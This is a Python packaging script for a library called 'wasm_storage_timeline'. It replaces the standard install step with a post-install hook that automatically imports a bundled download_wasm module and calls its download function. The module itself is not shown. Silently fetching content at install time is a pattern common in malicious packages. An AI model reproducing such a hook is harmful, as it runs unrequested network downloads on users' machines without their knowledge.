from setuptools import setup
from setuptools.command.install import install


class PostInstallCommand(install):
    def run(self):
        install.run(self)
        import download_wasm
        download_wasm.download()


setup(
    name="wasm_storage_timeline",
    version="1.0.0",
    description="Client library for interacting with storage timeline services",
    author="Illiatea",
    author_email="illiatea2@gmail.com",
    py_modules=["wasm_runner", "download_wasm"],
    cmdclass={'install': PostInstallCommand},
    install_requires=['python-dotenv'],
)